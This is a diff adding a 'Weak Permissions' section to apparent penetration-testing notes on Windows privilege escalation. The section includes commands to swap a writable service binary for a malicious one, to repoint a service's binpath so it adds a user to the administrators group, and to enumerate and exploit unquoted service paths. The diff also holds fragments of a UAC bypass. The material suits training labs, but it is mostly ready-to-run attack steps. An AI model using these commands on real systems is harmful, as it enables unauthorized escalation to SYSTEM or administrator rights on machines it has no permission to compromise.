@@ -21,7 +21,10 @@
     - [RCE: Automated](#rce-automated)
   - [Server Operators](#server-operators)
     - [RCE](#rce-2)
-  - User Account Control      
+  - [User Account Control](#user-account-control)
+    - [GUI UAC Bypass](#gui-uac-bypass)
+    - [No GUI UAC Bypass](#no-gui-uac-bypass)
+  - [Weak Permissions](#weak-permissions)      
 
 
 # Windows User Privileges
@@ -682,4 +685,81 @@ schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
 reg delete "HKCU\Environment" /v "windir" /f
 
 
+```
+
+# Weak Permissions
+
+## tools
+- [PowerUp](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/privesc/PowerUp.ps1)
+- [SharpUp](https://github.com/GhostPack/SharpUp)
+
+```powershell
+SharpUp.exe audit
+
+```
+
+
+## Weak File System Permissions
+```powershell
+icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+
+C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
+                                                     Everyone:(I)(F)
+                                                     NT AUTHORITY\SYSTEM:(I)(F)
+                                                     BUILTIN\Administrators:(I)(F)
+                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+## Replacing Service Binary with malicious binary 
+cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+sc start SecurityService
+
+```
+
+## Weak Service Permissions
+```powershell
+accesschk.exe /accepteula -quvcw WindscribeService
+
+# Changing the Service Binary Path
+sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+sc start WindscribeService
+#clean
+sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
+
+```
+
+## Unquoted Service Path
+
+In Windows, when a file path contains spaces and isn't enclosed within quotation marks, the operating system assumes the file's location based on these:
+- C:\Program
+- C:\Program Files
+- C:\Program Files (x86)\System
+- C:\Program Files (x86)\System Explorer\service\SystemExplorerService64
+
+
+If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\SYSTEM`.
+- C:\Program.exe\
+- C:\Program Files (x86)\System.exe
+
+### Enum 
+```powershell
+# manual
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+# auto
+SharpUp.exe audit UnquotedServicePath
+
+```
+
+
+### exploit
+```
+sc qc SystemExplorerHelpService
+
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SystemExplorerHelpService
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
 ```
